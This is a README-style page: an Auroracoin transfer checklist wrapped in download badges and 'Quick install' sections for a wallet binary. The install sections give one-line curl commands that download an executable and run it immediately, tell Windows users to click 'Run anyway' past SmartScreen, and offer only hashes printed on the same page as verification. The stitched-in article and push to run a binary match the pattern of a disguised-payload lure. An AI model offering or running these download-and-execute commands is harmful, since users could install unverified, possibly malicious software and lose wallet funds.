![Aurora Wallet on-chain transfer checklist guide](assets/aurora-wallet-guide-article-banner.png)

# The on-chain transfer checklist for Auroracoin

Eleven checks between deciding to send AUR and watching the first confirmation arrive.

## Downloads - 2026.08.1.0

<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |


A transfer cannot be reversed, so the checklist exists to catch the mistakes that reversing would fix in a bank.

An on-chain payment is final once a miner includes it. The address, the amount and the fee are fixed at broadcast, and no support desk can undo them. Working through a short list before pressing send removes nearly every way a transfer goes wrong.


<!-- ARTICLE-BODY-BEGIN -->

## Before you press send

1. Confirm the receiving address character by character, or scan its QR code instead of copying text.
2. Check that the address starts with the letter A, which is the Auroracoin prefix.
3. Confirm the wallet is fully synced, so the balance you see is current.
4. Send a small test amount first when the destination is new.
5. Check the fee line before you confirm.
6. Write down the transaction identifier once the wallet shows it.

Scanning a QR code removes the clipboard from the process, and the clipboard is where address-swapping malware lives. <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/31-receiving-addresses-qr.md">Receiving addresses and QR codes</a> shows where the wallet generates and reads them.

## After the broadcast

7. Search the transaction identifier on a public explorer.
8. Confirm the recipient sees the same amount once the transaction confirms.
9. Keep the sender wallet open until the confirmation count rises.
10. Send the remainder only after the test confirms, when you split a large move.
11. Record the amount, the fee and the date for your own records.

A transaction that stays at zero confirmations needs patience rather than a resend, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/16-pending-transaction.md">pending transaction</a> explains how to tell a waiting transaction from one that never left.

## Moving a whole balance

A full migration is a series of transfers rather than one. Test the destination, move the bulk, then sweep or import the remaining keys, which is the order described in <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/27-migrate-from-auroracoin-core.md">migrating from Auroracoin Core</a>.

Keep the sending wallet on the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">current Aurora Wallet release</a>, because the history and confirmation display you rely on for these checks is part of the application.

## FAQ

### Why send a test amount first?

Because a wrong address costs the whole payment. A small test proves the address works before the large amount follows.

### Can a transaction be cancelled after broadcast?

No. Wait for confirmation, or for the network to drop a transaction it never relayed.

<!-- ARTICLE-BODY-END -->


## How to install Aurora Wallet

### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.

```cmd
certutil -hashfile setup.exe SHA256
```

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.

```bash
shasum -a 256 setup.dmg
```

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
2. Extract the archive.
3. Run `aurora-wallet`.

Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.

```bash
sha256sum app.zip
```


## Related guides

- [Receiving addresses and QR codes](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/31-receiving-addresses-qr.md)
- [Pending transaction](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/16-pending-transaction.md)
- [Transaction fees](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/17-transaction-fees.md)
- [Migrate from Auroracoin Core](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/27-migrate-from-auroracoin-core.md)
